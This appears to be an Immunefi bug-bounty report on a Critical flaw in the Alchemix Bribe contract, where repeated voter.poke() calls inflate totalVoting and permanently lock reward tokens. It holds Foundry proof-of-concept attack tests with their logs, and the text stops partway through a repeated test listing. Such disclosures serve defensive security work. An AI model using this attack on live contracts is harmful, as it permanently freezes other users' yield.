# 31141 - \[SC - Critical] Permanent freezing of unclaimed yield of reward...

## Permanent freezing of unclaimed yield of reward tokens in Bribe contract when attackers maliciously exploit voter.poke()

Submitted on May 13th 2024 at 10:11:55 UTC by @perseverance for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31141

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Permanent freezing of unclaimed yield
* Permanent freezing of unclaimed royalties

### Description

## Description

### Brief/Intro

Bribe contracts allow bribing users with voting power to vote for a specific gauge. The contract allows bribed users to claim their bribes.

when the function notifyRewardAmount() is called, the reward token is sent from the msg.sender to bribe contract and kept in this contract as reward.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L112>

```solidity
function notifyRewardAmount(address token, uint256 amount) external lock {

     IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

    tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + amount;
}
```

Holders of VeAlcx tokens after voting in Voter contract will earn some reward and can claim reward by calling function claimBribes in voter contract.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L332-L338>

```solidity
function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint256 _tokenId) external {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId));

        for (uint256 i = 0; i < _bribes.length; i++) {
            IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]);
        }
    }

```

Reward is calculated as follow:

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L283C5-L300C6>

```solidity
function getRewardForOwner(uint256 tokenId, address[] memory tokens) external lock {
        require(msg.sender == voter, "not voter");
        address _owner = IVotingEscrow(veALCX).ownerOf(tokenId);
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 _reward = earned(tokens[i], tokenId);

            require(_reward > 0, "no rewards to claim");

            lastEarn[tokens[i]][tokenId] = block.timestamp;

            _writeCheckpoint(tokenId, balanceOf[tokenId]);

            IERC20(tokens[i]).safeTransfer(_owner, _reward);

            emit ClaimRewards(_owner, tokens[i], _reward);
        }
    }

```

The earned() internal function is used to calculate the reward for a user.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L265-L278>

```solidity

function earned(address token, uint256 tokenId) public view returns (uint256) {

        // Redacted for simplicity 
        Checkpoint memory cp = checkpoints[tokenId][_endIndex];
        uint256 _lastEpochStart = _bribeStart(cp.timestamp);
        uint256 _lastEpochEnd = _lastEpochStart + DURATION;
        uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes;

        // Prevent divide by zero
        if (_priorSupply == 0) {
            _priorSupply = 1;
        }

        if (block.timestamp > _lastEpochEnd) {
            reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        }

        return reward;
}
```

The \_priorSupply is taken from votingCheckpoints\[].votes. This votes are updated whenever the deposit function into Bribe is called when user vote via Voter contract.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L306C8-L316C6>

```solidity
    function deposit(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply += amount;
        balanceOf[tokenId] += amount;

        totalVoting += amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();
        _writeVotingCheckpoint();

        emit Deposit(msg.sender, tokenId, amount);
    }


```

\_writeVotingCheckpoint() is called.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L362-L372>

```solidity
function _writeVotingCheckpoint() internal {
        uint256 _nCheckPoints = votingNumCheckpoints;
        uint256 _timestamp = block.timestamp;

        if (_nCheckPoints > 0 && votingCheckpoints[_nCheckPoints - 1].timestamp == _timestamp) {
            votingCheckpoints[_nCheckPoints - 1].votes = totalVoting;
        } else {
            votingCheckpoints[_nCheckPoints] = VotingCheckpoint(_timestamp, totalVoting);
            votingNumCheckpoints = _nCheckPoints + 1;
        }
    }

```

### The vulnerability

#### Vulnerability Details

With that basic understanding, I will explain the Vulnerability now.

The vulnerability is that when user deposit() by calling vote() function via Voter contract, then the \_writeVotingCheckpoint() is called. Then the votingCheckpoints\[].votes is updated to be the totalVoting. In the function deposit, the totalVoting is increased. But in function withdraw() the totalVoting is not decreasing.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L309>

```solidity
    function deposit(uint256 amount, uint256 tokenId) external {

        totalVoting += amount;
    } 
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L319-L329>

```solidity
 function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
}
```

So now in the Voter contract, the function poke() allows the owner of tokenId to call in the same EPOCH. If this happen, then the vote of user is first withdrawned and then deposit again. The balanceOf and totalSuppy is accounting correctly, but the totalVoting will be increased because in withdraw() function, it was not updated.

So if a user call poke() in the same EPOCH, he will cause the totalVoting to be wrong. The attacker can maliciously call poke() several times to maliciously inflate the totalVoting.

When the totalVoting is inflated, each user will receive less reward intended by the system. So total earned will be less then the total reward. The reward left in the contract will be frozen as there is no way to take this reward out of the contract.

To easier for understanding, I will explain this with a scenario.

Step 1:\
3 users: Alice, Bob and the attacker create locks with 1e18 BPT token

```solidity
        uint256 tokenId1 = createVeAlcx(attacker, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        
```

Step 2: The bribe contract receive some reward, suppose 100\_000e18 BAL

```solidity
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
```

```solidity
    function createThirdPartyBribe(address _bribeAddress, address _token, uint256 _amount) public {
        deal(_token, address(this), _amount);

        IERC20(_token).approve(_bribeAddress, _amount);

        if (!IVoter(voter).isWhitelisted(_token)) {
            hevm.prank(address(timelockExecutor));
            IVoter(voter).whitelist(_token);
        }

        IBribe(_bribeAddress).notifyRewardAmount(_token, _amount);
    }
    
```

Step 3: Each user will vote

```solidity
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        
        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

```

Step 4: Fast forward 1 EPOCH and each user will be able to claim 1/3 of 100\_000e18 BAL token as reward. If all users claim then the left token in the contract will be nearly zero.

```solidity
        hevm.warp(newEpoch()); 
        
        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 
        
         earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

         earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
```

So each user will get: 33333.33333333e18 that is 1/3 of the reward. This is expected amount

Log:

```
  Fast forward 1 epoch
  earnedBribes1 33333333333333333333333
  earnedBribes2 33333333333333333333333
  earnedBribes3 33333333333333333333333
  Bal balance of attacker: 33333333333333333333333
  Bal balance of Alice: 33333333333333333333333
  Bal balance of Bob: 33333333333333333333333
  Bal balance of Bribe contract: 1
```

But if the user call poke() in the same EPOCH as in the step 3, then the totalVoting will be inflated.

I demonstrated this in the test case testBribeClaimingPoke\_Hacked\_2()

```solidity
        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting());        
        hevm.stopPrank();
```

The log shows:

```
  totalVoting after vote(): % 1999407217131972451
  Call voter poke()
  totalVoting after poke(): % 3998814434263944902
```

And then in step 4, the total of rewards claimed by all users will be less than the total reward. There will be tokens left in the contract. Bal balance of Bribe contract: 25000000000000000000000

```
[PASS] testBribeClaimingPoke_Hacked_2() (gas: 4471757)
Logs:
  Bal balance of Bribe contract: 100000000000000000000000
  totalVoting after vote(): % 1999407217131972451
  Call voter poke()
  totalVoting after poke(): % 3998814434263944902
  earnedBribes0 0
  earnedBribes2 0
  earnedBribes3 0
  Fast forward 1 epoch
  earnedBribes1 25000000000000000000000
  Bal balance of attacker: 25000000000000000000000
  earnedBribes2 25000000000000000000000
  earnedBribes3 25000000000000000000000
  Bal balance of Alice: 25000000000000000000000
  Bal balance of Bob: 25000000000000000000000
  Bal balance of Bribe contract: 25000000000000000000000

```

Now the attacker can also exploit this vulnerablity to cause "Permanent freezing of unclaimed yield" or 'Permanent freezing of unclaimed royalties" by maliciously call poke() many times to inflate totalVoting. The left amount of reward will be stuck in this contract. There is no way to get it out so it is Permanent freezing of unclaimed yield. s

I demonstrated this in the test case: testBribeClaimingPoke\_Hacked()

```solidity
        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
                hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        hevm.stopPrank();
```

So the totalVoting will be inflated more and the left token will be more. In this POC, the Bal balance left in the Bribe contract 50000000000000000000002 that is 1/2 of the reward amount.

Log:

```
  Bal balance of Bribe contract: 100000000000000000000000
  Call voter poke()
  totalVoting after poke(): % 3998814434263944902
  totalVoting after poke(): % 5998221651395917353
  totalVoting after poke(): % 7997628868527889804
  Fast forward 1 epoch
  earnedBribes1 16666666666666666666666
  Bal balance of attacker: 16666666666666666666666
  earnedBribes2 16666666666666666666666
  earnedBribes3 16666666666666666666666
  Bal balance of Alice: 16666666666666666666666
  Bal balance of Bob: 16666666666666666666666
  Bal balance of Bribe contract: 50000000000000000000002
```

## Impacts

## About the severity assessment

The impact of this vulnerability is: This bug will result in "Permanent freezing of unclaimed yield" or 'Permanent freezing of unclaimed royalties" because the reward token will be left in the Bribe contract and cannot be taken out, so it is permanently frozen in this contract.

This bug can happen with normal users when the call the poke() in the same EPOCH as vote().

Or this bug can be exploited by attacker to cause this impact.

This bug severity: High Category: Permanent freezing of unclaimed yield or Permanent freezing of unclaimed royalties

Capital for the attack: Gas to execute the transactions. Some amount of BPT to invest to lock to get the VeAlcx tokens.

Easy to exploit and easy to be automated.

### Proof of concept

## Proof of concept

I created 3 test cases to demonstrate the 3 scenarios for attack and a normal scenario to clearly see the attack.

### testBribeClaimingPoke\_Hacked

I demonstrated this attack in the test case:

```solidity
    function testBribeClaimingPoke_Hacked() public {

        
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
                hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        hevm.stopPrank();

        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1);
        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);

        console2.log("Fast forward 1 epoch"); 
        hevm.warp(newEpoch()); 
        //voter.distribute();
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        hevm.stopPrank();

        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 
        
        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);        

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
    
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 
        
    }
```

Step 1:\
3 users: Alice, Bob and the attacker create locks with 1e18 BPT token

```solidity
        uint256 tokenId1 = createVeAlcx(attacker, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        
```

Step 2: The bribe contract receive some reward, suppose 100\_000e18 BAL

```solidity
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
```

```solidity
    function createThirdPartyBribe(address _bribeAddress, address _token, uint256 _amount) public {
        deal(_token, address(this), _amount);

        IERC20(_token).approve(_bribeAddress, _amount);

        if (!IVoter(voter).isWhitelisted(_token)) {
            hevm.prank(address(timelockExecutor));
            IVoter(voter).whitelist(_token);
        }

        IBribe(_bribeAddress).notifyRewardAmount(_token, _amount);
    }
    
```

Step 3: Each user will vote

```solidity
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        
        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

```

Step 3.1: Attacker call poke() repeatedly to inflate the totalVoting

```solidity
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
                hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        hevm.stopPrank();
```

Step 4: Fast forward 1 EPOCH and each user will be able to claim 1/3 of 100\_000e18 BAL token as reward. If all users claim then the left token in the contract will be nearly zero.

```solidity
        hevm.warp(newEpoch()); 
        
        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 
        
         earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

         earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
```

The full log of this test case:

```
[PASS] testBribeClaimingPoke_Hacked() (gas: 4855977)
Logs:
  Bal balance of Bribe contract: 100000000000000000000000
  Call voter poke()
  totalVoting after poke(): % 3998814434263944902
  totalVoting after poke(): % 5998221651395917353
  totalVoting after poke(): % 7997628868527889804
  earnedBribes0 0
  earnedBribes2 0
  earnedBribes3 0
  Fast forward 1 epoch
  earnedBribes1 16666666666666666666666
  Bal balance of attacker: 16666666666666666666666
  earnedBribes2 16666666666666666666666
  earnedBribes3 16666666666666666666666
  Bal balance of Alice: 16666666666666666666666
  Bal balance of Bob: 16666666666666666666666
  Bal balance of Bribe contract: 50000000000000000000002
```

### testBribeClaimingPoke\_Hacked\_2()

I also created the test case for the case that a normal user call poke() in this POC:

```solidity
function testBribeClaimingPoke_Hacked_2() public {

        
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting());        
        hevm.stopPrank();

        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1);
        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);

        console2.log("Fast forward 1 epoch"); 
        hevm.warp(newEpoch()); 
        
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        hevm.stopPrank();

        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 
        
        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);        

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
    
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 
        
    }


```

The full log:

```
[PASS] testBribeClaimingPoke_Hacked_2() (gas: 4470612)
Logs:
  Bal balance of Bribe contract: 100000000000000000000000
  Call voter poke()
  totalVoting after poke(): % 3998814434263944902
  earnedBribes0 0
  earnedBribes2 0
  earnedBribes3 0
  Fast forward 1 epoch
  earnedBribes1 25000000000000000000000
  Bal balance of attacker: 25000000000000000000000
  earnedBribes2 25000000000000000000000
  earnedBribes3 25000000000000000000000
  Bal balance of Alice: 25000000000000000000000
  Bal balance of Bob: 25000000000000000000000
  Bal balance of Bribe contract: 25000000000000000000000
```

### testBribeClaimingPoke\_Normal()

I also created the test case for a normal scenario

```solidity
function testBribeClaimingPoke_Normal() public {

      
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        
        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1); 

        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);
        
        console2.log("Fast forward 1 epoch"); 
        // Start second epoch
        hevm.warp(newEpoch()); 
        
        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 
        
         earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

         earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        
    }
```

The log:

```
[PASS] testBribeClaimingPoke_Normal() (gas: 5253330)
Logs:
  Bal balance of Bribe contract: 100000000000000000000000
  earnedBribes0 0
  earnedBribes2 0
  earnedBribes3 0
  Fast forward 1 epoch
  earnedBribes1 33333333333333333333333
  earnedBribes2 33333333333333333333333
  earnedBribes3 33333333333333333333333
  Bal balance of attacker: 33333333333333333333333
  Bal balance of Alice: 33333333333333333333333
  Bal balance of Bob: 33333333333333333333333
  Bal balance of Bribe contract: 1
```

The left token in the contract in this scenario is 1 token, that is just dust.

### The full test cases:

```solidity
 address Alice = address(0x11223344); 
    address Bob = address(0x55667788);
    uint256 tokenId3;  
    uint256 earnedBribes2; 
    uint256 earnedBribes3; 

    function testBribeClaimingPoke_Hacked() public {

        
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
                hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting()); 
        hevm.stopPrank();

        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1);
        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);

        console2.log("Fast forward 1 epoch"); 
        hevm.warp(newEpoch()); 
        //voter.distribute();
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        hevm.stopPrank();

        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 
        
        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);        

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
    
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 
        
    }

    function testBribeClaimingPoke_Hacked_2() public {

        
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        console2.log("totalVoting after vote(): %", IBribe(bribeAddress).totalVoting());
        console2.log("Call voter poke()"); 
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        console2.log("totalVoting after poke(): %", IBribe(bribeAddress).totalVoting());        
        hevm.stopPrank();

        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1);
